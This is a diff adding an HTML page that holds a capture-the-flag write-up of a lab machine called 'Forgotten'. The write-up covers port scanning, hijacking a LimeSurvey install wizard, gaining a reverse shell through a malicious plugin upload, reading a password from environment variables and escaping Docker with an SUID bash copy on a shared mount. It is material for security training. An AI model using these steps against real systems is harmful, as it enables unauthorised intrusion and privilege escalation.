@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><title>Forgotten &ndash; Tim&#39;s Docs</title>
+<meta name="description" content="Research, Writeups and more.">
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8"/>
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.4/css/academicons.min.css" integrity="sha512-IW0nhlW5MgNydsXJO40En2EoCkTTjZhI3yuODrZIc8cQ4h1XcF53PsqDHa09NqnkXuIe0Oiyyj171BqZFwISBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+<link rel="stylesheet" href="http://localhost:1313/css/palettes/tender.css">
+<link rel="stylesheet" href="http://localhost:1313/css/risotto.css">
+<link rel="stylesheet" href="http://localhost:1313/css/custom.css">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta property="og:title" content="Forgotten &ndash; Tim&#39;s Docs" />
+<meta property="og:url" content="http://localhost:1313/writeups/htb/machines/linux/forgotten/" />
+
+  
+    <meta property="og:description" content="Research, Writeups and more."/> 
+  
+
+<meta property="og:locale" content="en" />
+<meta property="og:image" content="" /></head>
+
+    <body>
+        <div class="page">
+
+            <header class="page__header"><nav class="page__nav main-nav">
+    <ul>
+      <li class="nomarker"><h1 class="page__logo"><a href="http://localhost:1313/" class="page__logo-inner">Tim&#39;s Docs</a></h1></li>
+    
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:1313/about/" title="">About</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:1313/writeups/" title="">Writeups</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:1313/blog/" title="">Blog</a></li>
+    
+    </ul>
+</nav>
+
+</header>
+
+            <section class="page__body">
+    <header class="content__header">
+        <h1>Forgotten</h1>
+    </header>
+    <div class="content__body">
+        <h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap-scan">NMap Scan</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT   STATE SERVICE REASON         VERSION    
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:                                                                                                       
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 28:c7:f1:96:f9:53:64:11:f8:70:55:68:0b:e5:3c:22 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMIbLmW6I3vlf8QRrAaFLhH3Ao7CFIvqPPmQG0Z14i0SlPfX9IZobRkjLOB0ncKb5oQ/0SXLnU60rnUe+7Xe6BU<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 02:43:d2:ba:4e:87:de:77:72:ce:5a:fa:86:5c:0d:f4 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICGL/2c6HVh+6F9RbNsZpoYJ2jv4C8SGqtskv0GGuU2P
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack ttl <span style="color:#ae81ff">62</span> Apache httpd 2.4.56                                                              
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.56 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-methods:                                                                                                      
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET POST OPTIONS HEAD
+</span></span><span style="display:flex;"><span>|_http-title: <span style="color:#ae81ff">403</span> Forbidden          
+</span></span><span style="display:flex;"><span>Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>Navigating to port 80 returns a 403 Forbidden. Apache version 2.4.56 is disclosed in the server header.</p>
+<p><img src="port80.png" alt="Port 80 Forbidden"></p>
+<h3 id="directory-enumeration">Directory Enumeration</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ ffuf -u http://10.129.234.81/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>survey                  <span style="color:#f92672">[</span>Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 16ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>server-status           <span style="color:#f92672">[</span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 13ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>29999/29999<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">2020</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:00:15<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">1</span> ::
+</span></span></code></pre></div><p>ffuf discovers a <code>/survey</code> directory redirecting with a 301.</p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="setting-up-the-limesurvey-instance">Setting Up the LimeSurvey Instance</h3>
+<p>Navigating to <code>/survey</code> reveals a LimeSurvey installation requiring a database. We spin up a local SQL Docker instance to satisfy the setup wizard.</p>
+<p><img src="survey-setup.png" alt="Survey Setup"></p>
+<p>The database type is identified during setup:</p>
+<p><img src="db-identification.png" alt="Database Identification"></p>
+<p>Pointing the SQL database at our attacker IP <code>10.10.14.85</code>:</p>
+<p><img src="db-config.png" alt="Database Configuration"></p>
+<p>The service automatically creates and populates the database. At the end of setup we are given administrator credentials:</p>
+<p><img src="admin-creds.png" alt="Admin Credentials"></p>
+<p>After logging into the admin panel, the LimeSurvey version is shown in the bottom right:</p>
+<p><img src="admin-panel-version.png" alt="Admin Panel Version"></p>
+<h3 id="limesurvey-rce-via-malicious-plugin">LimeSurvey RCE via Malicious Plugin</h3>
+<p>Searching for exploits reveals <a href="https://github.com/Y1LD1R1M-1337/Limesurvey-RCE">https://github.com/Y1LD1R1M-1337/Limesurvey-RCE</a>, an RCE PoC that abuses the plugin upload functionality.</p>
+<p>After modifying the files, we zip them up:</p>
+<p><img src="plugin-zip.png" alt="Plugin Zip"></p>
+<p>Navigate to the plugin page and install the malicious zip:</p>
+<p><img src="plugin-install.png" alt="Plugin Install"></p>
+<p>The plugin is extracted to:</p>
+<pre tabindex="0"><code>http://forgotten.vl/survey/upload/plugins/Y1LD1R1M/
+</code></pre><p>Curling the <code>php-rev.php</code> file triggers the reverse shell:</p>
+<p><img src="rce-shell.png" alt="RCE Shell"></p>
+<h3 id="credential-discovery-via-environment-variables">Credential Discovery via Environment Variables</h3>
+<p>Checking environment variables on the container reveals hardcoded credentials:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>limesvc@efaa6f5097ed:/$ env
+</span></span><span style="display:flex;"><span>&lt;...SNIP...&gt;
+</span></span><span style="display:flex;"><span>LIMESURVEY_ADMIN<span style="color:#f92672">=</span>limesvc
+</span></span><span style="display:flex;"><span>LIMESURVEY_PASS<span style="color:#f92672">=</span>5W5HN4K4GCXf9E
+</span></span></code></pre></div><p>These credentials work over SSH to access the host directly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh limesvc@forgotten.vl  <span style="color:#75715e"># password: 5W5HN4K4GCXf9E</span>
+</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="docker-escape-via-mount">Docker Escape via Mount</h3>
+<p>Checking sudo privileges inside the container:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ script -qc /bin/bash /dev/null
+</span></span><span style="display:flex;"><span>limesvc@efaa6f5097ed:/$ sudo -l
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User limesvc may run the following commands on efaa6f5097ed:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> ALL
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>limesvc@efaa6f5097ed:/$ sudo su
+</span></span><span style="display:flex;"><span>root@efaa6f5097ed:/# id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>We have full root inside the container. Checking mounts reveals a shared directory with the host:</p>
+<p><img src="docker-mounts.png" alt="Docker Mounts"></p>
+<p>We confirm the mount by creating a temp file inside the container and locating it on the host:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Inside container</span>
+</span></span><span style="display:flex;"><span>root@efaa6f5097ed:/var/www/html/survey# mktemp -p .
+</span></span><span style="display:flex;"><span>./tmp.DRQvdbUhiN
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># On host</span>
+</span></span><span style="display:flex;"><span>limesvc@forgotten:~$ find / -name tmp.DRQvdbUhiN -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/opt/limesurvey/tmp.DRQvdbUhiN
+</span></span></code></pre></div><p>We have arbitrary read/write on the host filesystem through the mount. Copy bash into the mount and set the SUID bit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@efaa6f5097ed:/var/www/html/survey# cp /bin/bash .
+</span></span><span style="display:flex;"><span>root@efaa6f5097ed:/var/www/html/survey# chmod +s bash
+</span></span></code></pre></div><p>On the host, the SUID bash binary is now present:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>limesvc@forgotten:/opt/limesurvey$ ls -lah bash
+</span></span><span style="display:flex;"><span>-rwsr-sr-x <span style="color:#ae81ff">1</span> root root 1.2M Mar <span style="color:#ae81ff">16</span> 01:11 bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>limesvc@forgotten:/opt/limesurvey$ ./bash -p
+</span></span><span style="display:flex;"><span>bash-5.1# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div>
+    </div>
+    <footer class="content__footer"></footer>
+
+            </section>
+
+            <section class="page__aside">
+                <div class="aside__about">
+<div class="aside__about">
+    
+    
+<h1 class="about__title">About</h1>
+<p class="about__description">Research, Writeups and more.</p>
+</div>
+
+
+<ul class="aside__social-links">
+    
+    <li>
+        <a href="https://github.com/Tim-K36" rel="me" aria-label="GitHub" title="GitHub"><i class="fa-brands fa-github" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+</ul>
+</div>
+                <hr>
+                <div class="aside__content">
+    
+    
+        <p>
+            
+            2026-05-20
+        </p>
+    
+
+    
+	    <hr>
+	    On this page:
+	    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#enumeration">Enumeration</a>
+      <ol>
+        <li><a href="#nmap-scan">NMap Scan</a></li>
+        <li><a href="#directory-enumeration">Directory Enumeration</a></li>
+      </ol>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ol>
+        <li><a href="#setting-up-the-limesurvey-instance">Setting Up the LimeSurvey Instance</a></li>
+        <li><a href="#limesurvey-rce-via-malicious-plugin">LimeSurvey RCE via Malicious Plugin</a></li>
+        <li><a href="#credential-discovery-via-environment-variables">Credential Discovery via Environment Variables</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ol>
+        <li><a href="#docker-escape-via-mount">Docker Escape via Mount</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+    
+
+                </div>
+            </section>
+
+            <footer class="page__footer"><p class="copyright"></p>
+<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
+</footer>
+
+        </div>
+    </body>
+
+</html>
